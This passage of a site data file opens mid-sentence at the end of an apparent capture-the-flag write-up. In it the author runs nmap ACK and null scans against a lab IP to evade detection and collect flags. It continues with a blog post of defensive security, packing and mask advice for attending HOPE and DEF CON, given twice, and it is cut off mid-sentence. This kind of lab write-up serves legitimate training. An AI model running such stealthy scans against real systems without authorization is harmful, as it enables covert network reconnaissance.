noticing.&lt;/p&gt;\n&lt;p&gt;New target IP is 10.10.34.244.&lt;/p&gt;\n&lt;p&gt;Maybe speed doesn’t matter here? Let’s try a scan that shouldn’t even look like a connection — an ACK scan — but at a more “normal” rate.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.34.244&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Well, that resulted in an almost immediate flag. Switching to &lt;code&gt;-T2&lt;/code&gt; for the timing here also incremented things quite quickly.&lt;/p&gt;\n&lt;p&gt;What about a null scan? That might actually get me more information than an ACK scan, but should elicit &lt;em&gt;any&lt;/em&gt; response from open ports.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.34.244&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;“Null scan” is apparently the right answer, as the challenge provided the flag almost immediately (which doesn’t &lt;em&gt;actually&lt;/em&gt; make any sense, but whatever…).&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 31 min&lt;/p&gt;","rssInclude":true},"journals/2022-08-15":{"slug":"journals/2022-08-15","filePath":"journals/2022-08-15.md","title":"Notes from HOPE and DEF CON","links":["spells/Wi-Fi","spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory"],"tags":["Journal/Commentary"],"content":"Now that both HOPE and DEF CON are behind me, I want to summarize some of my initial thoughts. This is not a “what did I learn about hacking” post, but rather musings about attending these events.\nDevice security\nThe internet is awash with advice to only bring burner phones/laptops to DEF CON (or hacker conferences in general), to assume any credit card you use while attending (or even being near) DEF CON is compromised, etc.\nAfter much consideration, I’ve come to believe that much of this “advice” is ill-conceived, and shows either the advice-giver’s poor risk modeling abilities or inflated sense of their own importance. Rob Graham’s advice is much better: Encrypt your stuff and be careful about Wi-Fi and Bluetooth, and you’ll almost certainly be fine.\nAssuming that you’re using up-to-date devices, the main risks of going to a hacker conference are the same as any sort of travel: Theft, assault, abuse by the local authorities. I’m not the kind of person who needs to worry as much about the second two of these, so theft is my main concern. Here’s my general travel setup, which I think is also pretty solid for hacker conferences:\n\nI don’t take my regular computer with me. I travel with a recent iPad Pro and iPhone, and also bring along a Raspberry Pi (currently a 4B running Kali Linux — I have a guide covering how to set that up if you’re interested) in case I need tools I can’t run on the iPad (this is actually less common than you’d think).\nAll of my devices are encrypted.\nI use Face ID on my iPad Pro and iPhone, but not for the lock screen. A strong passcode or PIN is required for initial device access — I think of Face ID as an extra layer of security for individual apps rather than what provides the actual device security.\nI run a minimal-ish set of applications, and regularly review and uninstall anything I’m not currently using.\nBefore leaving (generally the morning I head for the airport, unless i have a really early flight), I make sure that all of my devices are running the most up-to-date versions of their operating systems and apps, and run a complete backup.\nI have Find My active on all of my devices so if the device is stolen I can lock/wipe it remotely.\nFinally, I use Proton VPN on all my devices. I do this not for “privacy” reasons, but because using a VPN is a way to ensure that any applications that are not using encrypted connections or are vulnerable to downgrade attacks have an extra layer of protection. That Proton VPN also provides some on-the-wire malware blocking is an added bonus.\n\nNow, hacker conferences do generally have a more hostile radio frequency environment, so I do take extra care here.\n\nI turn off Bluetooth and leave it off attending the conference. Since I only travel with wired headphones, this isn’t a big hardship for me. The only time I turn on Bluetooth is if I want to edit any photography (I have an Apple Pencil for my iPad), but I only do this when away from the conference area.\nI remove all Wi-Fi networks from my devices (which means deleting them from iCloud Keychain). For DEF CON, I configure the secure conference Wi-Fi before leaving. That said, I keep Wi-Fi turned off on my devices as well unless I absolutely need it.\n\nFinally, you want to be careful what you’re plugging into your devices. Personally, I bring my own cables and charger, and don’t use anything provided by another conference attendee or plug in any devices (for example, USB drives) that I didn’t bring with me.\nThere’s not some kind of magical “hacker miasma” at these conferences that puts your device at risk — someone looking to compromise your device needs to be able to get data to it. By limiting connections to radio networks and avoiding untrusted devices, the opportunity for an attack is severely curtailed (though it cannot be eliminated). The main risk here is someone attempting to subvert a trusted connection (the DEF CON secure Wi-Fi network, the Bluetooth connection to my Apple Pencil, or the cellular radio on my iPhone); the best defense is simply keeping your shit up-to-date and pre-configure trusted connections. It’s very unlikely that someone is going to burn a cellular zero day on you at a hacker conference.\nIf your risk model is that a nation state is gunning for you, then you need to be worrying about a lot more than just conference security! Needless to say, this guide is not, then, for you.\nA note about credential management\nAn important layer of defense at hacker conferences, when traveling, or just in life is good credential management.\nI use different usernames/emails for almost every service. Both Proton Mail and Google Workspace can be configured with catch-all email addresses. If you don’t want to pay money, then sign up for Gmail and liberally use the + functionality.\nUse unique, random passwords for as many services as you can. Use a password manager (KeePassXC and compatible applications are good choices) to make this easy to manage. Don’t store these credentials in your browser or system keychain.\nSet up multi-factor authentication on every account that supports it. Whenever possible, use a hardware key (like a YubiKey). As a bonus, you can use hardware security keys to further lock down access to your password manager: Do this using either built-in support, or by storing a long random string in one of your security key “slots” and then using this in addition to a string that you’ve memorized to access your password vault (full-featured YubiKeys — not the lower-end “security keys” Yubico sells — support both options).\nPacking\nI’m a light packer, partly because I don’t like checking bags, and partly because I enjoy the challenge. This year I managed to fit all of my gear into a single Peak Design 20 L Everyday Backpack (with the help of two small packing cubes). However, this is all a tight fit — there’s next to no room for conference swag on the return trip, and the laptop compartments are compressed more than I’m comfortable with. Moving forward, I intend to switch to a Peak Design 30 L Everyday Backpack, as I think that the extra 10 L should be more than enough for me.\nThere’s enough (low profile) pockets in the Peak Design Everyday backpack that I don’t need a cord bag, and it’s a reasonable size to use as a day bag at the conference itself. This requires some unpacking/repacking at the hotel, but that’s a small price to pay to avoid having to carry an entire additional bag. Peak Design products are a bit pricey, but I’ve experimented with a lot of different bags over the years and they’re hands-down the most durable, versatile bags I’ve ever owned.\nOne thing that’s enables me to pack light is that I’ve moved away from wearing jeans. Instead, I’ve switched to Bluffworks’ Ascender 5-Pocket Pants, which are tough, light, wrinkle-resistant, very compressible, and have the bonus of being much harder to pick pocket than most other mens’ pants (though again, a determined thief can still defeat them). I pair these with Icebreaker underwear and socks, which are also exceptionally light and durable. Bluffworks also makes travel blazers and other outfits for less casual situations; these are also good for traveling light, but by necessity take up a bit more space. There’s a trade-off between looking nice and packing light that is just difficult to navigate.\nOne disadvantage of this setup is that it’s difficult to bring multiple pairs of shoes. I opt to just wear a pair of black running shoes — they’re not dress shoes, but they’re comfortable and sufficiently understated that you can get away with using them in less casual situations in a pinch.\nAt the con\nAt the conference, or really when traveling in general, I try to avoid being conspicuous. I don’t wear conference swag/merch. I don’t put stickers on my devices. I take off my conference badge and put it in my backpack when it’s not required. I don’t flash (or carry) big wads of cash.\nIn short, I try not to look like a target. Ideally, there should be no way for someone who sees you outside of the conference to know that you are an attendee.\nA note on masks\nI don’t like wearing masks, but if I’m going to wear one I’m going to wear an effective one. Since HOPE and DEF CON were both masked events, I brought along tight-fitting N95 masks for use while attending the conference.\nThe problem with a well-fitted N95 masks is that they’re kind of a pain to take off. This makes both eating and (more importantly) drinking a less attractive proposition. I wound up going back to my hotel to do both during the day, which created larger gaps in my schedule than I planned.\nMoving forward, I don’t think it makes sense to bring a water bottle to any events that have a mask requirement. I also need to remember that I can’t effectively pull off my normal back-to-back-to-back event schedule at conferences with mask requirements. This means doing less at these events than I otherwise would, but c’est la vie in the time of plague.","richContent":"&lt;p&gt;Now that both &lt;a href=&quot;https://xiv.hope.net/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;HOPE&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://defcon.org/html/defcon-30/dc-30-index.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DEF CON&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; are behind me, I want to summarize some of my initial thoughts. This is not a “what did I learn about hacking” post, but rather musings about &lt;em&gt;attending&lt;/em&gt; these events.&lt;/p&gt;\n&lt;h2 id=&quot;device-security&quot;&gt;Device security&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#device-security&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The internet is awash with advice to only bring burner phones/laptops to DEF CON (or hacker conferences in general), to assume any credit card you use while attending (or even being near) DEF CON is compromised, etc.&lt;/p&gt;\n&lt;p&gt;After much consideration, I’ve come to believe that much of this “advice” is ill-conceived, and shows either the advice-giver’s poor risk modeling abilities or inflated sense of their own importance. &lt;a href=&quot;https://blog.erratasec.com/2019/08/securing-devices-for-defcon.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Rob Graham’s advice&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is much better: Encrypt your stuff and be careful about &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; and Bluetooth, and you’ll almost certainly be fine.&lt;/p&gt;\n&lt;p&gt;&lt;em&gt;Assuming that you’re using up-to-date devices&lt;/em&gt;, the main risks of going to a hacker conference are the same as any sort of travel: Theft, assault, abuse by the local authorities. I’m not the kind of person who needs to worry as much about the second two of these, so theft is my main concern. Here’s my general travel setup, which I think is also pretty solid for hacker conferences:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;I &lt;em&gt;don’t&lt;/em&gt; take my regular computer with me. I travel with a recent &lt;a href=&quot;https://www.apple.com/ipad-pro/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;iPad Pro&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://www.apple.com/iphone/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;iPhone&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, and also bring along a &lt;a href=&quot;https://www.raspberrypi.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Raspberry Pi&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (currently a 4B running Kali Linux — I have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Use-a-Raspberry-Pi-4B-as-hacking-accessory&quot;&gt;a guide covering how to set that up&lt;/a&gt; if you’re interested) in case I need tools I can’t run on the iPad (this is actually less common than you’d think).&lt;/li&gt;\n&lt;li&gt;All of my devices are encrypted.&lt;/li&gt;\n&lt;li&gt;I use Face ID on my iPad Pro and iPhone, but &lt;em&gt;not&lt;/em&gt; for the lock screen. A strong passcode or PIN is required for initial device access — I think of Face ID as an extra layer of security for individual apps rather than what provides the actual &lt;em&gt;device&lt;/em&gt; security.&lt;/li&gt;\n&lt;li&gt;I run a minimal-ish set of applications, and regularly review and uninstall anything I’m not currently using.&lt;/li&gt;\n&lt;li&gt;Before leaving (generally the morning I head for the airport, unless i have a &lt;em&gt;really&lt;/em&gt; early flight), I make sure that all of my devices are running the most up-to-date versions of their operating systems and apps, and run a complete backup.&lt;/li&gt;\n&lt;li&gt;I have &lt;a href=&quot;https://www.apple.com/icloud/find-my/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Find My&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; active on all of my devices so if the device is stolen I can lock/wipe it remotely.&lt;/li&gt;\n&lt;li&gt;Finally, I use &lt;a href=&quot;https://protonvpn.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Proton VPN&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on all my devices. I do this not for “privacy” reasons, but because using a VPN is a way to ensure that any applications that are &lt;em&gt;not&lt;/em&gt; using encrypted connections or are vulnerable to downgrade attacks have an extra layer of protection. That Proton VPN also provides some on-the-wire malware blocking is an added bonus.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Now, hacker conferences &lt;em&gt;do&lt;/em&gt; generally have a more hostile radio frequency environment, so I do take extra care here.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;I turn off Bluetooth and leave it off attending the conference. Since I only travel with wired headphones, this isn’t a big hardship for me. The only time I turn on Bluetooth is if I want to edit any photography (I have an &lt;a href=&quot;https://www.apple.com/apple-pencil/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Apple Pencil&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for my iPad), but I only do this when away from the conference area.&lt;/li&gt;\n&lt;li&gt;I remove all &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; networks from my devices (which means deleting them from iCloud Keychain). For DEF CON, I configure &lt;a href=&quot;https://wifireg.defcon.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the secure conference Wi-Fi&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; before leaving. That said, I keep &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; turned off on my devices as well unless I absolutely need it.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Finally, you want to be careful what you’re plugging into your devices. Personally, I bring my own cables and charger, and don’t use anything provided by another conference attendee or plug in any devices (for example, USB drives) that I didn’t bring with me.&lt;/p&gt;\n&lt;p&gt;There’s not some kind of magical “hacker miasma” at these conferences that puts your device at risk — someone looking to compromise your device needs to be able to get data to it. By limiting connections to radio networks and avoiding untrusted devices, the opportunity for an attack is severely curtailed (though it cannot be eliminated). The main risk here is someone attempting to subvert a trusted connection (the DEF CON secure &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; network, the Bluetooth connection to my Apple Pencil, or the cellular radio on my iPhone); the best defense is simply keeping your shit up-to-date and pre-configure trusted connections. It’s very unlikely that someone is going to burn a cellular zero day on you at a hacker conference.&lt;/p&gt;\n&lt;p&gt;If your risk model is that a nation state is gunning for you, then you need to be worrying about a lot more than just conference security! Needless to say, this guide is not, then, for you.&lt;/p&gt;\n&lt;h3 id=&quot;a-note-about-credential-management&quot;&gt;A note about credential management&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#a-note-about-credential-management&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;An important layer of defense at hacker conferences, when traveling, or just &lt;em&gt;in life&lt;/em&gt; is good credential management.&lt;/p&gt;\n&lt;p&gt;I use different usernames/emails for almost every service. Both &lt;a href=&quot;https://proton.me/support/catch-all&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Proton Mail&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://support.google.com/a/answer/2685650&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Google Workspace&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; can be configured with catch-all email addresses. If you don’t want to pay money, then sign up for Gmail and liberally use &lt;a href=&quot;https://support.google.com/a/users/answer/9308648&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the &lt;code&gt;+&lt;/code&gt; functionality&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Use unique, random passwords for as many services as you can. Use a password manager (&lt;a href=&quot;https://keepassxc.org&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;KeePassXC&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and compatible applications are good choices) to make this easy to manage. Don’t store these credentials in your browser or system keychain.&lt;/p&gt;\n&lt;p&gt;Set up multi-factor authentication on &lt;em&gt;every&lt;/em&gt; account that supports it. Whenever possible, use a hardware key (like a &lt;a href=&quot;https://www.yubico.com/products/yubikey-5-overview/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;YubiKey&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;). As a bonus, you can use hardware security keys to further lock down access to your password manager: Do this using either &lt;a href=&quot;https://keepassxc.org/docs/KeePassXC_UserGuide.html#_database_settings&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;built-in support&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, or by storing a long random string in one of your security key “slots” and then using this &lt;em&gt;in addition to&lt;/em&gt; a string that you’ve memorized to access your password vault (full-featured YubiKeys — not the lower-end “security keys” Yubico sells — support both options).&lt;/p&gt;\n&lt;h2 id=&quot;packing&quot;&gt;Packing&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#packing&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;I’m a light packer, partly because I don’t like checking bags, and partly because I enjoy the challenge. This year I managed to fit all of my gear into a single &lt;a href=&quot;https://www.peakdesign.com/products/everyday-backpack&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Peak Design 20 L Everyday Backpack&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (with the help of two small &lt;a href=&quot;https://www.peakdesign.com/products/packing-cube/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;packing cubes&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;). However, this is all a tight fit — there’s next to no room for conference swag on the return trip, and the laptop compartments are compressed more than I’m comfortable with. Moving forward, I intend to switch 